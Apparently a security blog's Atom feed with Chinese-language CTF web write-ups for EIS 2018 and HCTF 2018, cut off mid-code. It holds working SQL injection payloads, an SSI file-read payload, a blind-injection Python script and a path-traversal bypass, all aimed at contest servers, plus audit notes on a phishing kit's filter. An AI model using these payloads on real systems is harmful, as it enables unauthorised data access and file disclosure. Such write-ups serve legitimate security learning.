<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sky&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://skysec.top/"/>
  <updated>2018-11-18T08:23:18.756Z</updated>
  <id>http://skysec.top/</id>
  
  <author>
    <name>一叶飘零</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>EIS-2018-web</title>
    <link href="http://skysec.top/2018/11/16/EIS-2018-web/"/>
    <id>http://skysec.top/2018/11/16/EIS-2018-web/</id>
    <published>2018-11-16T01:26:13.000Z</published>
    <updated>2018-11-18T08:23:18.756Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知 https://xz.aliyun.com/t/3310</span><br></pre></td></tr></table></figure><h2 id="SimpleBBS"><a href="#SimpleBBS" class="headerlink" title="SimpleBBS"></a>SimpleBBS</h2><p>随手登录一下<br><img src="/images/2018-11-16-09-27-35.png" alt=""><br>发现报错，于是尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and (extractvalue(1,concat(0x7e,database())))#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-10-11-26.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and (extractvalue(1,concat(0x7e,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()))))#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-10-11-57.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and (extractvalue(1,concat(0x7e,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=&apos;flag&apos;))))#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-10-12-32.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and (extractvalue(1,concat(0x7e,(select flag from flag limit 0,1))))#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-10-12-52.png" alt=""><br>前半段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;~EIS&#123;7879f0a27d8bcfcff0bcc837d76&apos;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and (extractvalue(1,concat(0x7e,(select substr(flag,30,60) from flag limit 0,1))))#</span><br></pre></td></tr></table></figure><p><img src="/images/2018-11-16-10-13-45.png" alt=""><br>后半段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~7641e81&#125;</span><br></pre></td></tr></table></figure></p><p>最后flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EIS&#123;7879f0a27d8bcfcff0bcc837d7641e81&#125;</span><br></pre></td></tr></table></figure></p><h2 id="SimpleServerInjection"><a href="#SimpleServerInjection" class="headerlink" title="SimpleServerInjection"></a>SimpleServerInjection</h2><p>题目提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SimpleServerInjection, SSI, flag in current directory</span><br></pre></td></tr></table></figure></p><p>随即搜索SSI<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/wutianxu123/article/details/82724637</span><br></pre></td></tr></table></figure></p><p>结果这个文章第一个就是payload。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include virtual=&quot;/etc/passwd&quot; --&gt;</span><br></pre></td></tr></table></figure></p><p>于是测试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://210.32.4.22/index.php?name=&lt;!--#include virtual=&quot;flag&quot; --&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-10-16-55.png" alt=""><br>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EIS&#123;59f2c02f18838b3fb57dd57e2808f9c2&#125;</span><br></pre></td></tr></table></figure></p><h2 id="SimpleExtensionExplorerInjection"><a href="#SimpleExtensionExplorerInjection" class="headerlink" title="SimpleExtensionExplorerInjection"></a>SimpleExtensionExplorerInjection</h2><p>题目提示XXE，直接xxe是不行的<br><img src="/images/2018-11-16-14-13-42.png" alt=""><br>所以需要改type<br><img src="/images/2018-11-16-12-33-01.png" alt=""><br>然后即可xxe读文件，得到flag</p><h2 id="SimplePrintEventLogger"><a href="#SimplePrintEventLogger" class="headerlink" title="SimplePrintEventLogger"></a>SimplePrintEventLogger</h2><p>直接可以进行列目录<br><img src="/images/2018-11-16-13-02-51.png" alt=""><br>然后得到flag<br><img src="/images/2018-11-16-12-53-33.png" alt=""><br>不知道是不是非预期了？题目提示RCE，还有一个backdoor的路由没用上<br><img src="/images/2018-11-16-14-12-36.png" alt=""></p><h2 id="SimpleBlog"><a href="#SimpleBlog" class="headerlink" title="SimpleBlog"></a>SimpleBlog</h2><p>发现题目提示2次注入<br><img src="/images/2018-11-16-14-08-24.png" alt=""><br>于是尝试注册<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sky&apos;</span><br><span class="line">sky&apos;#</span><br></pre></td></tr></table></figure></p><p>发现前者分数都是0，后者有分数<br>那么可以判断，更新分数的时候使用了用户名<br>但是想要构造一般的bool盲注不行，因为必须sql语句报错<br>这里想到整数溢出问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and if(1,exp(999999999999),1)#</span><br></pre></td></tr></table></figure></p><p>这样即可使sql语句报错，导致出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grade 0</span><br></pre></td></tr></table></figure></p><p>而如果使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and if(0,exp(999999999999),1)#</span><br></pre></td></tr></table></figure></p><p>那么分数一切正常，于是可以利用这一点进行注入<br>编写脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span><span class="params">(username,password=<span class="string">'1'</span>)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:password</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'http://210.32.4.20/register.php'</span></span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">return</span> r.headers[<span class="string">'Set-Cookie'</span>][<span class="number">10</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(session,username,password=<span class="string">'1'</span>)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password</span><br><span class="line">    &#125;</span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">'PHPSESSID'</span>:session</span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'http://210.32.4.20/login.php'</span></span><br><span class="line">    r = requests.post(url=url, data=data,cookies=cookie)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'10.a'</span>:<span class="string">'on'</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">'http://210.32.4.20/answer.php'</span></span><br><span class="line">    r = requests.post(url=url, data=data,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Your grades is 0'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    url = <span class="string">'http://210.32.4.20/logout.php'</span></span><br><span class="line">    r = requests.get(url=url,cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">flag = <span class="string">'EIS&#123;'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="string">'abcdef0123456789&#125;'</span>:</span><br><span class="line">        j = ord(k)</span><br><span class="line">        payload=<span class="string">'''1' and if((ascii(substr((select flag from flag limit 0,1),%d,1))=%d),exp(999999999999),1)#'''</span>%(i,j)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            session = reg(payload)</span><br><span class="line">            <span class="keyword">if</span> login(session,payload):</span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            session = reg(payload)</span><br><span class="line">            <span class="keyword">if</span> login(session,payload):</span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-16-14-09-27.png" alt=""><br>不知道题目提示文件包含是什么意思，可能非预期了?<br><img src="/images/2018-11-16-14-11-12.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2018 HCTF Web Writeup</title>
    <link href="http://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/"/>
    <id>http://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/</id>
    <published>2018-11-12T12:51:08.000Z</published>
    <updated>2018-11-13T04:30:28.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>打开题目，f12发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--source.php--&gt;</span><br></pre></td></tr></table></figure></p><p>以及hint和link：<code>http://warmup.2018.hctf.io/index.php?file=hint.php</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p><p>看到source.php，发现源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现只有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br></pre></td></tr></table></figure></p><p>才能通过，但发现截取有问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure></p><p>随即构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://warmup.2018.hctf.io/?file=hint.php?/../../../../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-11-09-20-52-08.png" alt=""><br>即可拿到flag</p><h2 id="Kzone"><a href="#Kzone" class="headerlink" title="Kzone"></a>Kzone</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>打开题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kzone.2018.hctf.io</span><br></pre></td></tr></table></figure></p><p>发现跳转到QQ空间，想到可能是钓鱼网站，于是curl一下<br>发现如下代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;form id="form" action="index.php" method="post" onsubmit="return onpost()"&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"2018.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">onSubmit</span>=<span class="string">"return ts()"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"q_logon_list"</span> <span class="attr">class</span>=<span class="string">"q_logon_list"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"web_login"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"g_list"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">liid</span></span></span><br><span class="line"><span class="tag">            =<span class="string">"g_u"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"del_touch"</span> <span class="attr">class</span>=<span class="string">"del_touch"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"del_u"</span> <span class="attr">class</span>=<span class="string">"del_u"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"u"</span> <span class="attr">class</span>=<span class="string">"inputstyle"</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">placeholder</span>=<span class="string">"KK_Account/Phone/Email"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"g_p"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"del_touch_p"</span> <span class="attr">class</span>=<span class="string">"del_touch"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"del_p"</span> <span class="attr">class</span>=<span class="string">"del_u"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"p"</span> <span class="attr">class</span>=<span class="string">"inputstyle"</span> <span class="attr">maxlength</span>=<span class="string">"16"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"pass"</span> <span class="attr">autocorrect</span>=<span class="string">"off"</span></span></span><br><span class="line"><span class="tag">                       <span class="attr">placeholder</span>=<span class="string">"Input your KK_Account please"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"go"</span> <span class="attr">name</span>=<span class="string">"submit"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">href</span>=<span class="string">"javascript:void(0);"</span> <span class="attr">id</span>=<span class="string">"onekey"</span>&gt;</span>Login quickly<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"switch"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"swicth_login"</span> <span class="attr">onClick</span>=<span class="string">"pt._switch()"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"zc_feedback"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"zc"</span></span></span><br><span class="line"><span class="tag">                                    <span class="attr">onclick</span>=<span class="string">"window.open('https://ssl.zc.qq.com/v3/index-chs.html?from=pt')"</span>&gt;</span>Register<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"forgetpwd"</span>&gt;</span>Retrieve password<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>于是可以判断为钓鱼网站，首先做个目录探测，容易发现www.zip源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kzone.2018.hctf.io/www.zip</span><br></pre></td></tr></table></figure></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>首先是结构：<br>admin文件夹：管理整个钓鱼网站，导出、查看、删除钓鱼信息<br>include文件：包含一些功能性文件<br>2018.php：钓鱼插入文件<br>然后进行大致分析，首先查看2018.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'./include/common.php'</span>;</span><br><span class="line">$realip = real_ip();</span><br><span class="line">$ipcount = $DB-&gt;count(<span class="string">"SELECT count(*) from fish_user where ip='$realip'"</span>);</span><br><span class="line"><span class="keyword">if</span> ($ipcount &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    $username = addslashes($_POST[<span class="string">'user'</span>]);</span><br><span class="line">    $password = addslashes($_POST[<span class="string">'pass'</span>]);</span><br><span class="line">    $address = getCity($realip);</span><br><span class="line">    $time = date(<span class="string">"Y-m-d H:i:s"</span>);</span><br><span class="line">    $ua = $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">    $device = get_device($ua);</span><br><span class="line">    $sql = <span class="string">"INSERT INTO `fish_user`(`username`, `password`, `ip`, `address`, `time`, `device`) VALUES ('&#123;$username&#125;','&#123;$password&#125;','&#123;$realip&#125;','&#123;$address&#125;','&#123;$time&#125;','&#123;$device&#125;')"</span>;</span><br><span class="line">    $DB-&gt;query($sql);</span><br><span class="line">    header(<span class="string">"Location: https://i.qq.com/?rd="</span> . $username);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Location: https://i.qq.com/?rd="</span> . $username);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现大概是将钓鱼用户的信息插入数据库，代码使用了许多sql语句，所以查看过滤，发现<code>/include/safe.php</code>有全局过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $blacklist = <span class="string">'/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace_callback($blacklist, <span class="function"><span class="keyword">function</span> <span class="params">($match)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'@'</span> . $match[<span class="number">0</span>] . <span class="string">'@'</span>;</span><br><span class="line">    &#125;, $string);</span><br><span class="line">&#125;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_GET[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_POST[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($value) &amp;&amp; !is_numeric($value)) &#123;</span><br><span class="line">        $value = safe($value);</span><br><span class="line">    &#125;</span><br><span class="line">    $_COOKIE[$key] = $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>过滤了get,post,cookie<br>但是http header应该没经过过滤，于是想到可否控制ip，然后达成insert注入<br>跟一下<code>real_ip()</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">real_ip</span><span 